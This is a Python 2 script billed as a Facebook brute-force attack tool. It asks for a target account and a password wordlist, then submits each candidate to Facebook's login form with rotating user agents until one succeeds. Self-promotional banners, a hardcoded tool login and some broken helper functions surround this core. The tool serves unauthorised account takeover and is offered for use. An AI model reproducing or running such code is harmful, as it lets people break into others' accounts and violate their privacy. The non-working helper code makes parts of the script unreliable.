#!/usr/bin/python2
#coding=utf-8
#The Credit For This Code Goes To BOTOL
#If You Wanna Take Credits For This Code, Please Look Yourself Again...
#Reserved2020


import os,sys,time,datetime,random,hashlib,re,threading,json,urllib,cookielib,requests,mechanize
from multiprocessing.pool import ThreadPool
from requests.exceptions import ConnectionError
from mechanize import Browser


reload(sys)
sys.setdefaultencoding('utf8')
br = mechanize.Browser()
br.set_handle_robots(False)
br.set_handle_refresh(mechanize._http.HTTPRefreshProcessor(),max_time=1)
br.addheaders = [('User-Agent', 'Opera/9.80 (Android; Opera Mini/32.0.2254/85. U; id) Presto/2.12.423 Version/12.16')]


def keluar():
	print "\x1b[1;91mExit"
	os.sys.exit()


def acak(b):
    w = 'ahtdzjc'
    d = ''
    for i in x:
        d += '!'+w[random.randint(0,len(w)-1)]+i
    return cetak(d)


def cetak(b):
    w = 'ahtdzjc'
    for i in w:
        j = w.index(i)
        x= x.replace('!%s'%i,'\033[%s;1m'%str(31+j))
    x += '\033[0m'
    x = x.replace('!0','\033[0m')
    sys.stdout.write(x+'\n')


def jalan(z):
	for e in z + '\n':
		sys.stdout.write(e)
		sys.stdout.flush()
		time.sleep(0.01)

#Dev:Botol_Mehedi
##### LOGO #####
logo ="""
 \033[1;96m ------------------------
 \033[1;32m < OFFICIAL CODER MEHEDI >
 \033[1;96m ------------------------
\033[1;96m
  =====================================================
                    ASSALAMU ALAIKUM                    
            Coded By : MEHEDI HASAN ARIYAN       
                 Facebook : fb.com/TheMehtan                
            Youtube : youtube.com/MasterTrick1     
                Website : www.BanglarTrick.xyz            
     ---------------    ---------------    ------------  
                    Team V-VIRUS [ TVV ]                     
  =====================================================
\033[1;32m _    _       __  __
\033[1;32m╭━━╮╭━━━┳━━━━┳━━━┳╮
\033[1;32m┃╭╮┃┃╭━╮┃╭╮╭╮┃╭━╮┃┃
\033[1;32m┃╰╯╰┫┃╱┃┣╯┃┃╰┫┃╱┃┃┃
\033[1;32m┃╭━╮┃┃╱┃┃╱┃┃╱┃┃╱┃┃┃╱╭╮
\033[1;32m┃╰━╯┃╰━╯┃╱┃┃╱┃╰━╯┃╰━╯┃
\033[1;32m╰━━━┻━━━╯╱╰╯╱╰━━━┻━━━╯
\033[1;97m------------------------------------+-----------------"""

def tik():
	titik = ['.   ','..  ','... ']
	for o in titik:
		print("\r\x1b[1;93mPlease Wait \x1b[1;93m"+o),;sys.stdout.flush();time.sleep(1)


back = 0
berhasil = []
cekpoint = []
oks = []
id = []
listgrup = []
vulnot = "\033[31mNot Vuln"
vuln = "\033[32mVuln"

os.system("clear")
print """
 \033[1;96m ------------------------
 \033[1;32m < OFFICIAL CODER MEHEDI >
 \033[1;96m ------------------------
\033[1;96m
  =====================================================
                    ASSALAMU ALAIKUM                    

            Coded By : MEHEDI HASAN ARIYAN    
            Facebook : THEMEHTAN                
            Youtube  : MASTER TRICK     
            GITHUB   : BOTOL MEHEDI            
    ---------------    ---------------    ------------  
                    \033[1;35mTeam V-VIRUS [ TVV ]                     
  =====================================================
\033[1;97m
------------------------------------+-----------------
\033[1;32m _    _       __  __
\033[1;32m╭━━╮╭━━━┳━━━━┳━━━┳╮
\033[1;32m┃╭╮┃┃╭━╮┃╭╮╭╮┃╭━╮┃┃
\033[1;92m┃╰╯╰┫┃╱┃┣╯┃┃╰┫┃╱┃┃┃
\033[1;32m┃╭━╮┃┃╱┃┃╱┃┃╱┃┃╱┃┃┃╱╭╮
\033[1;32m┃╰━╯┃╰━╯┃╱┃┃╱┃╰━╯┃╰━╯┃
\033[1;32m╰━━━┻━━━╯╱╰╯╱╰━━━┻━━━╯
\033[1;97m------------------------------------+-----------------"""

jalan("\033[1;96m---> \033[1;93mWelcome To My BruteForce Target Attack Tool")
jalan("\033[1;96m---> \033[1;32mIf You Have Any Problem You Can Contact On Facebook")
jalan("\033[1;96m---> \033[1;93mFacebook Page : facebook.com/TheMehtan")
jalan("\033[1;96m---> \033[1;32mPROUD TO BE A MUSLIM PROUD TO BE A BOTOL")

jalan('\033[1;96m---> \033[1;35m TEAM VVIRUS \033[1;31m[ TVV ]')

jalan('\033[1;96m \033[1;32m    ')

jalan('\033[1;96m \033[1;32m    ')



print "\033[1;96m----->\033[1;32mTOOL LOGIN \033[1;96m<-----"

CorrectUsername = "botol"
CorrectPassword = "botol"

loop = 'true'
while (loop == 'true'):
    username = raw_input("\033[1;34mTool Username \x1b[1;31m---> \x1b[1;32m")
    if (username == CorrectUsername):
    	password = raw_input("\033[1;34mTool Password \x1b[1;31m---> \x1b[1;32m")
        if (password == CorrectPassword):
            print "\033[1;32mACCESS GRANTED AS " + username #Dev:Botol_Mehedi
	    time.sleep(2)
            loop = 'false'
        else:
            print "\033[1;31mACCESS DENIED"
            os.system('xdg-open https://www.youtube.com/channel/UCHrEAeRj-txxabetgTPrb2g')
    else:
        print "\033[1;31mACCESS DENIED"
        os.system('xdg-open https://www.youtube.com/channel/UCHrEAeRj-txxabetgTPrb2g')
        
        jalan('\033[1;96m \033[1;32m    ')

jalan('\033[1;96m \033[1;32m    ')
        
jalan("\033[1;96m       \033[1;96mB_____________________________M")
jalan("\033[1;96m       \033[1;32mO_____________________________E")
jalan("\033[1;96m       \033[1;96mT_____________________________H")
jalan("\033[1;96m       \033[1;32mO_____________________________E")
jalan("\033[1;96m       \033[1;96mL_____________________________D")
jalan("\033[1;96m       \033[1;32m _____________________________I")

jalan("\033[1;96m \033[1;32m ")
jalan("\033[1;96m \033[1;32m ")
jalan("\033[1;96m \033[1;32m ")
jalan("\033[1;96m \033[1;32m ")
   
def login():
	os.system('clear')
	try:
		toket = open('login.txt','r')
		menu() 
	except (KeyError,IOError):
		os.system('clear')
		print logo
     	
		jalan(' \033[1;31m---> \033[1;93mWarning: \033[1;96mDONOT USE WIFI.THIS WILL WORK ONLY ON MOBILE DATA' )
		jalan(' \033[1;31m---> \033[1;93mWarning: \033[1;96mUse a New Account To Login' )
		jalan(' \033[1;31m---> \033[1;93mWarning: \033[1;31mEDITING MY SCRIPT WILL NOT MAKE YOU A BOTOL✅' ) 
		jalan(' \033[1;31m---> \033[1;96m IM NOT HARE TO PLAY THE GAME, IM HARE TO JUDGE THE PLAYERS ')
		jalan(' \033[1;32m---> \033[1;96m RESPECT YOUR BOSS, I MEAN RESPECT BOTOL MEHEDI')
		jalan(' \033[1;97m--------------------------------------------------')
		
		
import time
import os

os.system('clear')


email = str(raw_input("Facebook Username/Email/ID : "))


passwordlist = str(raw_input("Enter the wordlist name and path : "))


login = 'https://www.facebook.com/login.php?login_attempt=1'


useragents = [('Mozilla/5.0 (X11; Linux x86_64; rv:45.0) Gecko/20100101 Firefox/45.0','Mozilla/5.0 (X11; U; Linux i686; en-US; rv:1.9.0.1) Gecko/2008071615 Fedora/3.0.1-1.fc9 Firefox/3.0.1')]

def main():
	global br
	br = mechanize.Browser()
	cj = cookielib.LWPCookieJar()
	br.set_handle_robots(False)
	br.set_handle_redirect(True)
	br.set_cookiejar(cj)
	br.set_handle_equiv(True)
	br.set_handle_referer(True)
	br.set_handle_refresh(mechanize._http.HTTPRefreshProcessor(), max_time=1)
	welcome()
	search()
	print("Password does not exist in the wordlist")

	
	
def brute(password):
	sys.stdout.write("\r[*] Trying ..... {}\n".format(password))
	sys.stdout.flush()
	br.addheaders = [('User-agent', random.choice(useragents))]
	site = br.open(login)
	br.select_form(nr = 0)
	br.form['email'] = email
	br.form['pass'] = password
	sub = br.submit()
	log = sub.geturl()
	if log != login and (not 'login_attempt' in log):
			print("\n\n[+] Password Find = {}".format(password))
			raw_input("ANY KEY to Exit....")
			sys.exit(1)

			
def search():
	global password
	passwords = open(passwordlist,"r")
	for password in passwords:
		password = password.replace("\n","")
		brute(password)

		
#welcome 
def welcome():
	wel = """

        +=========================================+
        |....   Facebook Bruteforce Attack    ....|
        +-----------------------------------------+
        |           Author : Mehedi Hasan Ariyan  | 
        |	    GITHUB : Botol Mehedi         |
   	|           YOUTUBE : Master Trick        |
        +=========================================+
        |...........   \033[1;35mTEAM V-VIRUS    ...........|
        +----------------\033[1;93m-------------------------+\n\n
"""
	total = open(passwordlist,"r")
	total = total.readlines()
	print wel 
	print " [*] Account to crack : {}".format(email)
	print " [*] Loaded :" , len(total), "passwords"
	print " [*] Cracking, please wait ...\n\n"

	
if __name__ == '__main__':
	main()


